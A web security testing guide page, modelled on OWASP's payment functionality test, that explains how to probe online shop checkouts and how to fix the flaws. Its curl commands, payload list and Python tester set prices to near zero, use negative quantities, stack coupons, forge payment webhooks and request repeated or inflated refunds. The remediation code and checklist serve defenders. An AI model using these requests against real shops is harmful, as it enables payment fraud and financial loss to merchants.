# WSTG-BUSL-10: Test Payment Functionality

## Test ID
WSTG-BUSL-10

## Test Name
Test Payment Functionality

## High-Level Description

Payment functionality testing examines the security of e-commerce and financial transaction features. This includes testing for price manipulation, currency conversion issues, payment flow bypasses, and other vulnerabilities that could result in financial loss. Payment systems are critical targets for attackers and require thorough testing to prevent fraud and financial manipulation.

---

## What to Check

### Payment Security Controls

- [ ] Price integrity validation
- [ ] Quantity manipulation
- [ ] Currency handling
- [ ] Discount/coupon abuse
- [ ] Payment flow integrity
- [ ] Refund functionality
- [ ] Cart manipulation

### Attack Vectors

| Vector | Impact |
|--------|--------|
| Price manipulation | Pay less than intended |
| Quantity manipulation | Get more items |
| Currency confusion | Exchange rate exploit |
| Coupon stacking | Excessive discounts |
| Payment bypass | Get items for free |
| Refund fraud | Get money without return |

---

## How to Test

### Step 1: Test Price Manipulation

```bash
# Add item to cart at normal price
curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "product_id": 1,
        "quantity": 1
    }'

# Try to manipulate price in checkout
curl -s -X POST "https://target.com/api/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "cart_id": "abc123",
        "items": [{
            "product_id": 1,
            "quantity": 1,
            "price": 0.01
        }],
        "total": 0.01
    }'

# Check if price is in hidden form fields
curl -s "https://target.com/checkout" | grep -i "price\|amount\|total"

# Test price in URL parameters
curl -s "https://target.com/checkout?item=1&price=0.01"
```

### Step 2: Test Quantity Manipulation

```bash
# Test negative quantity
curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "product_id": 1,
        "quantity": -1
    }'

# Test zero quantity
curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "product_id": 1,
        "quantity": 0
    }'

# Test decimal quantity
curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "product_id": 1,
        "quantity": 0.001
    }'

# Test extremely large quantity
curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "product_id": 1,
        "quantity": 99999999
    }'
```

### Step 3: Test Discount/Coupon Abuse

```bash
#!/bin/bash
# Test coupon vulnerabilities

TOKEN="your_token"
BASE="https://target.com"

# Apply coupon multiple times
for i in {1..5}; do
    response=$(curl -s -X POST "$BASE/api/cart/coupon" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"code": "DISCOUNT10"}')
    echo "Attempt $i: $response"
done

# Stack different coupons
coupons=("SAVE10" "FREESHIP" "WELCOME" "VIP20")
for code in "${coupons[@]}"; do
    curl -s -X POST "$BASE/api/cart/coupon" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"code\": \"$code\"}"
done

# Check final total
curl -s "$BASE/api/cart" -H "Authorization: Bearer $TOKEN" | jq '.total'

# Try to apply coupon after payment
curl -s -X POST "$BASE/api/orders/123/coupon" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "DISCOUNT50"}'
```

### Step 4: Test Currency Manipulation

```bash
# Test currency conversion issues
currencies=("USD" "EUR" "GBP" "JPY" "BTC")

for currency in "${currencies[@]}"; do
    response=$(curl -s -X POST "https://target.com/api/checkout" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{
            \"cart_id\": \"abc123\",
            \"currency\": \"$currency\"
        }")
    echo "$currency: $response"
done

# Test with invalid currency
curl -s -X POST "https://target.com/api/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "cart_id": "abc123",
        "currency": "INVALID"
    }'

# Test currency in different parameters
curl -s -X POST "https://target.com/api/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "amount": 100,
        "currency": "JPY",
        "display_currency": "USD"
    }'
```

### Step 5: Test Payment Flow Bypass

```bash
# Try to access order confirmation without payment
curl -s "https://target.com/api/orders/create" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "cart_id": "abc123",
        "status": "paid"
    }'

# Try to skip payment step
curl -s -X POST "https://target.com/api/checkout/complete" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "cart_id": "abc123"
    }'

# Test with fake payment token
curl -s -X POST "https://target.com/api/checkout/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "cart_id": "abc123",
        "payment_token": "fake_token_12345"
    }'

# Test payment confirmation webhook manipulation
curl -s -X POST "https://target.com/api/webhooks/payment" \
    -H "Content-Type: application/json" \
    -d '{
        "order_id": "abc123",
        "status": "success",
        "amount": 0.01
    }'
```

### Step 6: Test Cart Modification After Checkout

```bash
# Start checkout
checkout_id=$(curl -s -X POST "https://target.com/api/checkout/start" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"cart_id": "abc123"}' | jq -r '.checkout_id')

# Try to add more items after checkout started
curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "product_id": 2,
        "quantity": 10
    }'

# Complete payment with original (lower) amount
curl -s -X POST "https://target.com/api/checkout/complete" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"checkout_id\": \"$checkout_id\"}"

# Check what was ordered
curl -s "https://target.com/api/orders/latest" \
    -H "Authorization: Bearer $TOKEN"
```

### Step 7: Test Refund Functionality

```bash
# Test refund without returning item
curl -s -X POST "https://target.com/api/orders/123/refund" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "reason": "Not satisfied"
    }'

# Test refund amount manipulation
curl -s -X POST "https://target.com/api/orders/123/refund" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "amount": 9999.99
    }'

# Test multiple refunds for same order
for i in {1..5}; do
    curl -s -X POST "https://target.com/api/orders/123/refund" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"reason": "Duplicate"}'
done
```

---

## Tools

### Payment Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Request manipulation | Modify payment parameters |
| **Stripe CLI** | Payment testing | Test payment flows |
| **PayPal Sandbox** | Payment testing | Test PayPal integration |

### Analysis

| Tool | Description |
|------|-------------|
| **Postman** | API testing |
| **Custom scripts** | Automated testing |

---

## Example Commands/Payloads

### Payment Manipulation Payloads

```json
// Price manipulation
{"price": 0}
{"price": 0.01}
{"price": -100}
{"unit_price": 0.001}

// Quantity manipulation
{"quantity": -1}
{"quantity": 0}
{"quantity": 0.001}
{"quantity": 999999999}

// Total manipulation
{"subtotal": 0}
{"tax": -10}
{"shipping": -50}
{"total": 0.01}

// Discount manipulation
{"discount": 100}
{"discount_percent": 999}
{"coupon_value": 999999}

// Currency manipulation
{"currency": "XXX"}
{"currency": ""}
{"amount": 100, "currency_rate": 0.01}
```

### Payment Testing Script

```python
#!/usr/bin/env python3
import requests
import json

class PaymentTester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        self.results = []

    def test_price_manipulation(self, product_id):
        """Test price manipulation vulnerabilities"""
        test_prices = [0, 0.01, -1, -100, 0.001]

        for price in test_prices:
            # Add to cart with manipulated price
            response = requests.post(
                f"{self.base_url}/api/cart/add",
                headers=self.headers,
                json={
                    "product_id": product_id,
                    "quantity": 1,
                    "price": price
                }
            )

            # Try checkout with manipulated price
            checkout_response = requests.post(
                f"{self.base_url}/api/checkout",
                headers=self.headers,
                json={
                    "items": [{
                        "product_id": product_id,
                        "quantity": 1,
                        "price": price
                    }],
                    "total": price
                }
            )

            accepted = response.status_code == 200 or checkout_response.status_code == 200

            self.results.append({
                "test": f"Price manipulation: {price}",
                "cart_status": response.status_code,
                "checkout_status": checkout_response.status_code,
                "vulnerable": accepted and price <= 0.01
            })

    def test_quantity_manipulation(self, product_id):
        """Test quantity manipulation"""
        test_quantities = [-1, 0, 0.5, 0.001, 999999999]

        for qty in test_quantities:
            response = requests.post(
                f"{self.base_url}/api/cart/add",
                headers=self.headers,
                json={
                    "product_id": product_id,
                    "quantity": qty
                }
            )

            self.results.append({
                "test": f"Quantity manipulation: {qty}",
                "status": response.status_code,
                "vulnerable": response.status_code == 200 and qty <= 0
            })

    def test_coupon_stacking(self, coupons):
        """Test if multiple coupons can be stacked"""

        # Clear cart first
        requests.delete(
            f"{self.base_url}/api/cart",
            headers=self.headers
        )

        # Add item
        requests.post(
            f"{self.base_url}/api/cart/add",
            headers=self.headers,
            json={"product_id": 1, "quantity": 1}
        )

        applied_count = 0
        for coupon in coupons:
            response = requests.post(
                f"{self.base_url}/api/cart/coupon",
                headers=self.headers,
                json={"code": coupon}
            )

            if response.status_code == 200:
                applied_count += 1

        self.results.append({
            "test": "Coupon stacking",
            "coupons_tried": len(coupons),
            "coupons_applied": applied_count,
            "vulnerable": applied_count > 1
        })

    def test_payment_bypass(self):
        """Test if payment can be bypassed"""

        # Try to create order without payment
        test_cases = [
            {"status": "paid"},
            {"payment_status": "completed"},
            {"payment_confirmed": True},
        ]

        for case in test_cases:
            payload = {
                "cart_id": "test123",
                **case
            }

            response = requests.post(
                f"{self.base_url}/api/orders",
                headers=self.headers,
                json=payload
            )

            self.results.append({
                "test": f"Payment bypass with: {case}",
                "status": response.status_code,
                "vulnerable": response.status_code == 200
            })

    def test_refund_abuse(self, order_id):
        """Test refund vulnerabilities"""

        # Test excessive refund amount
        response = requests.post(
            f"{self.base_url}/api/orders/{order_id}/refund",
            headers=self.headers,
            json={"amount": 999999}
        )

        self.results.append({
            "test": "Excessive refund amount",
            "status": response.status_code,
            "vulnerable": response.status_code == 200
        })

        # Test multiple refunds
        refund_count = 0
        for _ in range(5):
            response = requests.post(
                f"{self.base_url}/api/orders/{order_id}/refund",
                headers=self.headers,
                json={"reason": "test"}
            )
            if response.status_code == 200:
                refund_count += 1

        self.results.append({
            "test": "Multiple refunds",
            "refunds_processed": refund_count,
            "vulnerable": refund_count > 1
        })

    def generate_report(self):
        """Generate test report"""
        print("\n=== PAYMENT SECURITY TEST REPORT ===\n")

        vulnerable = [r for r in self.results if r.get("vulnerable")]

        print(f"Total tests: {len(self.results)}")
        print(f"Vulnerabilities found: {len(vulnerable)}")

        if vulnerable:
            print("\n--- VULNERABILITIES ---")
            for v in vulnerable:
                print(f"  [VULN] {v['test']}")

        print("\n--- ALL RESULTS ---")
        for r in self.results:
            status = "[VULN]" if r.get("vulnerable") else "[OK]"
            print(f"  {status} {r['test']}")

# Usage
tester = PaymentTester("https://target.com", "auth_token")
tester.test_price_manipulation(product_id=1)
tester.test_quantity_manipulation(product_id=1)
tester.test_coupon_stacking(["SAVE10", "WELCOME", "FREESHIP"])
tester.test_payment_bypass()
tester.test_refund_abuse(order_id="test123")
tester.generate_report()
```

---

## Remediation Guide

### 1. Server-Side Price Validation

```python
from decimal import Decimal

class OrderProcessor:
    def process_checkout(self, cart_id, client_data):
        """Process checkout with server-side validation"""

        # Get cart from database
        cart = Cart.query.get(cart_id)

        if not cart:
            raise ValueError("Cart not found")

        # Calculate total server-side - NEVER trust client
        total = Decimal('0')

        for item in cart.items:
            # Get current price from database
            product = Product.query.get(item.product_id)

            if not product or not product.in_stock:
                raise ValueError(f"Product {item.product_id} unavailable")

            # Validate quantity
            if item.quantity <= 0 or item.quantity > product.max_quantity:
                raise ValueError("Invalid quantity")

            # Calculate with database price
            item_total = product.current_price * item.quantity
            total += item_total

        # Apply discounts server-side
        if cart.coupon:
            discount = self.calculate_discount(cart.coupon, total)
            total -= discount

        # Validate total is positive
        if total <= 0:
            raise ValueError("Invalid order total")

        # Ignore any totals from client
        return self.create_order(cart, total)
```

### 2. Signed Cart/Checkout Tokens

```python
import hmac
import hashlib
import json

def generate_checkout_token(cart_items, total):
    """Generate signed token for checkout"""
    data = {
        "items": [
            {"id": i.id, "qty": i.quantity, "price": str(i.price)}
            for i in cart_items
        ],
        "total": str(total),
        "timestamp": datetime.utcnow().isoformat()
    }

    signature = hmac.new(
        SECRET_KEY.encode(),
        json.dumps(data, sort_keys=True).encode(),
        hashlib.sha256
    ).hexdigest()

    return {
        "data": data,
        "signature": signature
    }

def verify_checkout_token(token):
    """Verify checkout token hasn't been tampered with"""
    expected_sig = hmac.new(
        SECRET_KEY.encode(),
        json.dumps(token["data"], sort_keys=True).encode(),
        hashlib.sha256
    ).hexdigest()

    return hmac.compare_digest(expected_sig, token["signature"])
```

### 3. Atomic Payment Processing

```python
from sqlalchemy import event
from contextlib import contextmanager

@contextmanager
def payment_transaction(order_id):
    """Ensure atomic payment processing"""
    order = Order.query.with_for_update().get(order_id)

    if not order:
        raise ValueError("Order not found")

    if order.status != 'pending':
        raise ValueError("Order already processed")

    try:
        yield order
        order.status = 'paid'
        db.session.commit()
    except Exception as e:
        order.status = 'failed'
        db.session.commit()
        raise

def process_payment(order_id, payment_token):
    """Process payment atomically"""
    with payment_transaction(order_id) as order:
        # Verify payment with payment provider
        payment_result = payment_gateway.verify(
            payment_token,
            amount=order.total,
            currency=order.currency
        )

        if not payment_result.success:
            raise PaymentError(payment_result.error)

        order.payment_id = payment_result.transaction_id
        order.paid_at = datetime.utcnow()
```

### 4. Refund Controls

```python
class RefundProcessor:
    def process_refund(self, order_id, amount=None, reason=None):
        """Process refund with controls"""
        order = Order.query.get(order_id)

        if not order:
            raise ValueError("Order not found")

        # Check refund eligibility
        if order.status not in ['paid', 'delivered']:
            raise ValueError("Order not eligible for refund")

        # Check refund window
        if order.paid_at < datetime.utcnow() - timedelta(days=30):
            raise ValueError("Refund window expired")

        # Calculate maximum refund
        previous_refunds = Refund.query.filter_by(order_id=order_id).all()
        total_refunded = sum(r.amount for r in previous_refunds)
        max_refund = order.total - total_refunded

        if max_refund <= 0:
            raise ValueError("Order already fully refunded")

        # Validate refund amount
        refund_amount = amount or max_refund
        if refund_amount > max_refund:
            raise ValueError(f"Maximum refund is {max_refund}")

        # Process refund
        refund = Refund(
            order_id=order_id,
            amount=refund_amount,
            reason=reason,
            processed_by=current_user.id
        )

        db.session.add(refund)
        db.session.commit()

        # Initiate actual refund with payment provider
        payment_gateway.refund(order.payment_id, refund_amount)

        return refund
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Price manipulation to $0 | 9.8 | Critical |
| Payment bypass | 9.8 | Critical |
| Unlimited refund amount | 9.8 | Critical |
| Coupon stacking abuse | 7.5 | High |
| Quantity manipulation | 7.5 | High |
| Cart modification after checkout | 8.8 | High |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-20** | Improper Input Validation | Price/quantity not validated |
| **CWE-841** | Improper Enforcement of Behavioral Workflow | Payment bypass |
| **CWE-840** | Business Logic Errors | Financial logic flaws |

---

## References

- [OWASP WSTG - Test Payment Functionality](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test_Payment_Functionality)
- [OWASP E-Commerce Security](https://owasp.org/www-project-web-security-testing-guide/)
- [PCI DSS Requirements](https://www.pcisecuritystandards.org/)

---

## Checklist

```
[ ] Price manipulation tested
[ ] Quantity manipulation tested
[ ] Negative value handling tested
[ ] Discount/coupon stacking tested
[ ] Currency manipulation tested
[ ] Payment flow bypass tested
[ ] Webhook manipulation tested
[ ] Cart modification after checkout tested
[ ] Refund amount manipulation tested
[ ] Multiple refund prevention tested
[ ] Server-side validation verified
[ ] Findings documented
[ ] Remediation recommendations provided
```
